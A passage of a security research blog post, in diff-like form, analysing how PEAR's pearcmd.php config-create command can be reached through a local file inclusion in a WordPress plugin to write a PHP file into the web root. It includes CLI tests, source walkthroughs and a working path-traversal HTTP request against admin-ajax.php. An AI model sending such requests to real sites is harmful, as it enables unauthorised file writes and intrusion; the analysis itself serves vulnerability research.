+</h2><p>The author&rsquo;s article mentions a payload related to <code>config-create</code>, described as used to create a configuration file.</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" title="Description of config-create" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png" data-sub-html="<h2>doc-config</h2><p>Description of config-create</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc-config.png' alt="doc-config" height="387" width="608"></a><figcaption class="image-caption">Description of config-create</figcaption>
+  </figure></p>
+<p>When I tried running the command on CLI:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create
+</span></span><span class="line"><span class="cl">config-create: must have <span class="m">2</span> parameters, root path and filename to save as</span></span></code></pre></td></tr></table>
+</div>
+</div><p>When not enough parameters are provided, the program errors and requires two mandatory parameters:</p>
+<ul>
+<li><code>root path</code>: the root directory PEAR uses for package installation and configuration lookup.</li>
+<li><code>filename</code>: the filename to save the configuration as.</li>
+</ul>
+<p>Trying with parameters:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create test_root_path test_filename.php
+</span></span><span class="line"><span class="cl">Root directory must be an absolute path beginning with <span class="s2">&#34;/&#34;</span>, was: <span class="s2">&#34;test_root_path&#34;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Here PEAR insists <code>test_root_path</code> must be an absolute path starting with <code>/</code>.</p>
+<p>Running again with a valid path:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-sh" data-lang="sh"><span class="line"><span class="cl">root@e182501c47c4:/var/www/html# php /usr/local/lib/php/pearcmd.php config-create /test_root_path test_filename.php</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The returned output:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="hl"><span class="lnt"> 9
+</span></span><span class="hl"><span class="lnt">10
+</span></span><span class="hl"><span class="lnt">11
+</span></span><span class="hl"><span class="lnt">12
+</span></span><span class="hl"><span class="lnt">13
+</span></span><span class="hl"><span class="lnt">14
+</span></span><span class="lnt">15
+</span><span class="hl"><span class="lnt">16
+</span></span><span class="hl"><span class="lnt">17
+</span></span><span class="lnt">18
+</span><span class="hl"><span class="lnt">19
+</span></span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="hl"><span class="lnt">28
+</span></span><span class="hl"><span class="lnt">29
+</span></span><span class="hl"><span class="lnt">30
+</span></span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="hl"><span class="lnt">43
+</span></span><span class="lnt">44
+</span><span class="hl"><span class="lnt">45
+</span></span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Configuration (channel pear.php.net):
+</span></span><span class="line"><span class="cl">=====================================
+</span></span><span class="line"><span class="cl">Auto-discover new Channels     auto_discover    &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Default Channel                default_channel  pear.php.net
+</span></span><span class="line"><span class="cl">HTTP Proxy Server Address      http_proxy       &lt;not set&gt;
+</span></span><span class="line"><span class="cl">PEAR server [DEPRECATED]       master_server    &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Default Channel Mirror         preferred_mirror &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Remote Configuration File      remote_config    &lt;not set&gt;
+</span></span><span class="line hl"><span class="cl">PEAR executables directory     bin_dir          /test_root_path/pear
+</span></span><span class="line hl"><span class="cl">PEAR documentation directory   doc_dir          /test_root_path/pear/docs
+</span></span><span class="line hl"><span class="cl">PHP extension directory        ext_dir          /test_root_path/pear/ext
+</span></span><span class="line hl"><span class="cl">PEAR directory                 php_dir          /test_root_path/pear/php
+</span></span><span class="line hl"><span class="cl">PEAR Installer cache directory cache_dir        /test_root_path/pear/cache
+</span></span><span class="line hl"><span class="cl">PEAR configuration file        cfg_dir          /test_root_path/pear/cfg
+</span></span><span class="line"><span class="cl">directory
+</span></span><span class="line hl"><span class="cl">PEAR data directory            data_dir         /test_root_path/pear/data
+</span></span><span class="line hl"><span class="cl">PEAR Installer download        download_dir     /test_root_path/pear/download
+</span></span><span class="line"><span class="cl">directory
+</span></span><span class="line hl"><span class="cl">Systems manpage files          man_dir          /test_root_path/pear/man
+</span></span><span class="line"><span class="cl">directory
+</span></span><span class="line"><span class="cl">PEAR metadata directory        metadata_dir     &lt;not set&gt;
+</span></span><span class="line"><span class="cl">PHP CLI/CGI binary             php_bin          &lt;not set&gt;
+</span></span><span class="line"><span class="cl">php.ini location               php_ini          &lt;not set&gt;
+</span></span><span class="line"><span class="cl">--program-prefix passed to     php_prefix       &lt;not set&gt;
+</span></span><span class="line"><span class="cl">PHP&#39;s ./configure
+</span></span><span class="line"><span class="cl">--program-suffix passed to     php_suffix       &lt;not set&gt;
+</span></span><span class="line"><span class="cl">PHP&#39;s ./configure
+</span></span><span class="line hl"><span class="cl">PEAR Installer temp directory  temp_dir         /test_root_path/pear/temp
+</span></span><span class="line hl"><span class="cl">PEAR test directory            test_dir         /test_root_path/pear/tests
+</span></span><span class="line hl"><span class="cl">PEAR www files directory       www_dir          /test_root_path/pear/www
+</span></span><span class="line"><span class="cl">Cache TimeToLive               cache_ttl        &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Preferred Package State        preferred_state  &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Unix file mask                 umask            &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Debug Log Level                verbose          &lt;not set&gt;
+</span></span><span class="line"><span class="cl">PEAR password (for             password         &lt;not set&gt;
+</span></span><span class="line"><span class="cl">maintainers)
+</span></span><span class="line"><span class="cl">Signature Handling Program     sig_bin          &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Signature Key Directory        sig_keydir       &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Signature Key Id               sig_keyid        &lt;not set&gt;
+</span></span><span class="line"><span class="cl">Package Signature Type         sig_type         &lt;not set&gt;
+</span></span><span class="line"><span class="cl">PEAR username (for             username         &lt;not set&gt;
+</span></span><span class="line"><span class="cl">maintainers)
+</span></span><span class="line hl"><span class="cl">User Configuration File        Filename         /var/www/html/test_filename.php
+</span></span><span class="line"><span class="cl">System Configuration File      Filename         #no#system#config#
+</span></span><span class="line hl"><span class="cl">Successfully created default configuration file &#34;/usr/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The result shows child paths for each type of data being auto-generated under <code>/test_root_path/pear</code>. On the last line:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Successfully created default configuration file &#34;/usr/www/html/test_filename.php&#34;</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The configuration file was created in the current working directory, not under <code>root_path</code>. This is PEAR&rsquo;s default behavior: <code>root_path</code> only affects the layout of install directories, not the location of the saved config file.</p>
+<p>When accessing the file <code>&quot;/var/www/html/test_filename.php&quot;</code> via a browser:</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" title="Contents of test_filename.php rendered in the browser" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png" data-sub-html="<h2>file-create</h2><p>Contents of test_filename.php rendered in the browser</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/file-create.png' alt="file-create" height="137" width="1919"></a><figcaption class="image-caption">Contents of test_filename.php rendered in the browser</figcaption>
+  </figure></p>
+<p>The created file contains information about <code>test_root_path</code>, presented in <code>serialize</code> format.</p>
+<p>However, that was the CLI execution path. For web exploitation, one must analyze the source to see how the program accepts and processes parameters passed in.</p>
+<h2 class="heading-element" id="pearcmd-code-analysis"><span><code>pearcmd</code> Code Analysis</span>
+  <a href="#pearcmd-code-analysis" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>Before analyzing <code>/usr/local/lib/php/pearcmd.php</code>, it&rsquo;s useful to set up a debugging environment to observe execution flow — see: <a href="https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/"target="_blank" rel="external nofollow noopener noreferrer">https://w41bu1.github.io/2025-10-22-wordpress-local-and-debugging-docker/</a></p>
+<p>Then copy all PHP source from the container to a local machine, preserving directory structure, so when the debugger stops at <code>/usr/local/lib/php/pearcmd.php</code> you can open and inspect the corresponding file from the container:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">sudo docker cp wordpress:/usr/local/lib/php/ /usr/local/lib/php/</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight" title="/usr/local/lib/php/pearcmd.php"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR/Frontend.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR/Config.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;PEAR/Command.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="k">require_once</span> <span class="s1">&#39;Console/Getopt.php&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$all_commands</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">getCommands</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$argv</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">readPHPArgv</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$options</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">getopt2</span><span class="p">(</span><span class="nv">$argv</span><span class="p">,</span> <span class="s2">&#34;c:C:d:D:Gh?sSqu:vV&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nx">array_shift</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nv">$fetype</span> <span class="o">==</span> <span class="s1">&#39;Gtk2&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">...</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">do</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="k">list</span><span class="p">(</span><span class="nv">$tmpopt</span><span class="p">,</span> <span class="nv">$params</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$tmp</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">        <span class="nv">$ok</span> <span class="o">=</span> <span class="nv">$cmd</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$opts</span><span class="p">,</span> <span class="nv">$params</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nv">$ok</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;unknown command `</span><span class="si">$command</span><span class="s2">&#39;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="o">...</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="k">false</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>First, all commands are loaded into <code>$all_commands</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$all_commands</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">getCommands</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">getCommands</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="k">empty</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;_PEAR_Command_commandlist&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">registerCommands</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;_PEAR_Command_commandlist&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><code>getCommands()</code> calls <code>registerCommands()</code> to register the commands.</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" title="All commands are loaded into `$all_commands`" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png" data-sub-html="<h2>all_commands</h2><p>All commands are loaded into `$all_commands`</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/all_commands.png' alt="all\_commands" height="390" width="362"></a><figcaption class="image-caption">All commands are loaded into `$all_commands`</figcaption>
+  </figure></p>
+<p>Then <code>$argv</code> is initialized:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$argv</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">readPHPArgv</span><span class="p">();</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight" title="php/Console/Getopt.php"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="hl"><span class="lnt"> 4
+</span></span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="hl"><span class="lnt">12
+</span></span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">public</span> <span class="k">static</span> <span class="k">function</span> <span class="nf">readPHPArgv</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">global</span> <span class="nv">$argv</span><span class="p">;</span>
+</span></span><span class="line hl"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$argv</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="o">!@</span><span class="nx">is_array</span><span class="p">(</span><span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="p">][</span><span class="s1">&#39;argv&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s2">&#34;Could not read cmd args (register_argc_argv=Off?)&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="nx">PEAR</span><span class="o">::</span><span class="na">raiseError</span><span class="p">(</span><span class="s2">&#34;Console_Getopt: &#34;</span> <span class="o">.</span> <span class="nv">$msg</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="nv">$GLOBALS</span><span class="p">[</span><span class="s1">&#39;HTTP_SERVER_VARS&#39;</span><span class="p">][</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line hl"><span class="cl">        <span class="k">return</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;argv&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nv">$argv</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>If <code>$argv</code> is not an array (i.e., no valid data), the function tries to find the equivalent in <code>$_SERVER['argv']</code> and return it — that is, the <code>search-word</code> parts we pass in the URL. Example:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-http" data-lang="http"><span class="line"><span class="cl"><span class="nf">GET</span> <span class="nn">/wp-admin/admin-ajax.php?action=geo_mashup_query&amp;object_ids=2&amp;template=../../../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/test_root_path+test_filename.php</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Observed in the debugger:</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" title="Value of `$argv` in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png" data-sub-html="<h2>argv1</h2><p>Value of `$argv` in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv1.png' alt="argv1" height="156" width="1634"></a><figcaption class="image-caption">Value of `$argv` in the debugger</figcaption>
+  </figure></p>
+<p>Next <code>$argv</code> has its first element removed and is passed to <code>Console_Getopt::getopt2()</code>, the return value assigned to <code>$options</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">array_shift</span><span class="p">(</span><span class="nv">$argv</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$options</span> <span class="o">=</span> <span class="nx">Console_Getopt</span><span class="o">::</span><span class="na">getopt2</span><span class="p">(</span><span class="nv">$argv</span><span class="p">,</span> <span class="s2">&#34;c:C:d:D:Gh?sSqu:vV&#34;</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>The value is now:</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" title="Values of `$argv` and `$options` in the debugger" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png" data-sub-html="<h2>argv_options</h2><p>Values of `$argv` and `$options` in the debugger</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/argv_options.png' alt="argv\_options" height="244" width="1634"></a><figcaption class="image-caption">Values of `$argv` and `$options` in the debugger</figcaption>
+  </figure></p>
+<p>The <code>$command</code> variable is initialized from <code>$options[1][0]</code>, in this case <code>config-create</code>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$command</span> <span class="o">=</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]))</span> <span class="o">?</span> <span class="nv">$options</span><span class="p">[</span><span class="mi">1</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">:</span> <span class="k">null</span><span class="p">;</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Then a factory is created and assigned to <code>$cmd</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$cmd</span> <span class="o">=</span> <span class="nx">PEAR_Command</span><span class="o">::</span><span class="na">factory</span><span class="p">(</span><span class="nv">$command</span><span class="p">,</span> <span class="nv">$config</span><span class="p">);</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>Hovering <code>$cmd</code> shows the required parameters for the <code>config-create</code> command.</p>
+<p><figure><a class="lightgallery" href="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" title="Required parameters for the `config-create` command" data-thumbnail="/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png" data-sub-html="<h2>doc</h2><p>Required parameters for the `config-create` command</p>"><img loading="lazy" src='/posts/2025-10-22-bypass-lfi-forced-php-suffix-via-pearcmd/doc.png' alt="doc" height="424" width="861"></a><figcaption class="image-caption">Required parameters for the `config-create` command</figcaption>
+  </figure></p>
+<p>Notably, the execution function for <code>config-create</code> is <code>doConfigCreate</code>:</p>
+<div class="highlight" title="/usr/local/lib/php/PEAR/Command.php"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="hl"><span class="lnt">54
+</span></span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span></code></pre></td>
+<td class="lntd">
